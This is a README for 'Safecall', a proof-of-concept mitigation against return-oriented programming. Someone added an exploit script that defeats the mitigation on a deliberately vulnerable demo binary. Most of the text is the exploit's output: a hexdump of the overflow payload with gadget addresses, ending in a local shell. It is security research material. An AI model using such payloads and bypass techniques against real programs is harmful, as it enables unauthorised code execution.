# Safecall -- return to abort() attacks

A small proof of concept using code introspection to make ROP exploitation
really really suck.

## Zach's Changes

I made a real Makefile and added a [pwntools](http://pwntools.com) script to exploit a sample program "protected" with this mitigation.

See [`demo.c`](demo.c) for the trivially vulnerable program, and [`win.py`](win.py) for the exploit script.

## Example

You should probably run the example on Ubuntu.

```bash
$ make
$ pip install -U pwntools
$ python win.py
[*] '/home/pwntools/ctf-solutions/return-to-abort/demo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] 0x40050b
[*] 00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  6c 61 61 61  │iaaa│jaaa│kaaa│laaa│
    00000030  6d 61 61 61  6e 61 61 61  6f 61 61 61  70 61 61 61  │maaa│naaa│oaaa│paaa│
    00000040  71 61 61 61  72 61 61 61  0b 05 40 00  00 00 00 00  │qaaa│raaa│··@·│····│
    00000050  75 61 61 61  76 61 61 61  77 61 61 61  78 61 61 61  │uaaa│vaaa│waaa│xaaa│
    00000060  79 61 61 61  7a 61 61 62  62 61 61 62  63 61 61 62  │yaaa│zaab│baab│caab│
    00000070  64 61 61 62  65 61 61 62  66 61 61 62  67 61 61 62  │daab│eaab│faab│gaab│
    00000080  68 61 61 62  69 61 61 62  6a 61 61 62  6b 61 61 62  │haab│iaab│jaab│kaab│
    00000090  6c 61 61 62  6d 61 61 62  20 06 40 00  00 00 00 00  │laab│maab│ ·@·│····│
    000000a0
[+] Starting local process './demo': pid 3470
[+] Have a shell!
[*] Switching to interactive mode
$ id
uid=1000(pwntools) gid=1000(pwntools) groups=1000(pwntools)
$ ls
Makefile  demo      demo.s       example      safecall.awk
core      demo.c  demo.safe.s  readme.md  win.py
$
[*] Interrupted
[*] Stopped process './demo' (pid 3470)
```
